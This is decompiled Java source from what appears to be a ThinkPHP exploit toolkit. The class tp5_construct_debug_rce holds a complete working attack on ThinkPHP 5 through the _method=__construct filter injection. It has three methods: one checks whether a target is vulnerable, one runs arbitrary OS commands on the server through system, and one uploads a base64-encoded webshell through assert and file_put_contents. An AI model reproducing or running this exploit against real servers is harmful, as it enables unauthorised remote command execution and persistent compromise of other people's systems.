/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import dylan.tools.Util;
/*    */ import java.net.URLEncoder;
/*    */ import java.nio.charset.StandardCharsets;
/*    */ import java.util.Base64;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp5_construct_debug_rce
/*    */   implements BaseExp {
/* 14 */   private String results = null;
/* 15 */   private HashMap<String, String> property = new HashMap<>();
/*    */   
/*    */   public String vulCheck(String url) {
/* 18 */     url = url + "/index.php";
/* 19 */     String payload = "_method=__construct&filter[]=var_dump&server[REQUEST_METHOD]=dylan";
/* 20 */     this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 21 */     Response response = HttpTool.post(url, payload, this.property);
/* 22 */     if (response.getText().contains("string(5) \"dylan\"")) {
/* 23 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + " 漏洞";
/* 24 */       return this.results;
/*    */     } 
/* 26 */     if (response.getError() != null) {
/* 27 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 28 */       return this.results;
/*    */     } 
/* 30 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 31 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 36 */     url = url + "/index.php";
/* 37 */     String payload = "_method=__construct&filter[]=system&server[REQUEST_METHOD]=" + cmd;
/* 38 */     this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 39 */     Response response = HttpTool.post(url, payload, this.property);
/* 40 */     if (response.getError() == null) {
/* 41 */       this.results = Util.regReplace(response.getText());
/*    */     } else {
/* 43 */       this.results = response.getError();
/*    */     } 
/* 45 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/*    */     try {
/* 51 */       content = Base64.getEncoder().encodeToString(content.getBytes(StandardCharsets.UTF_8));
/* 52 */       content = URLEncoder.encode(content, "UTF-8");
/* 53 */       String payload = "_method=__construct&filter[]=assert&server[REQUEST_METHOD]=file_put_contents('" + fileName + "',base64_decode('" + content + "'))";
/* 54 */       this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 55 */       Response response = HttpTool.post(url, payload, this.property);
/* 56 */       if (response.getError() == null) {
/* 57 */         this.property.clear();
/* 58 */         response = HttpTool.get(url + "/" + fileName, this.property);
/* 59 */         if (response.getCode() == 200) {
/* 60 */           this.results = "[+] 上传成功，请检查URL：" + url + "/" + fileName;
/*    */         } else {
/* 62 */           this.results = "[-] 上传失败！";
/*    */         } 
/*    */       } else {
/* 65 */         this.results = "[-] 上传失败: " + response.getError();
/*    */       } 
/* 67 */     } catch (Exception e) {
/* 68 */       this.results = "[-] 上传失败: " + e.getMessage();
/*    */     } 
/* 70 */     return this.results;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp5_construct_debug_rce.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */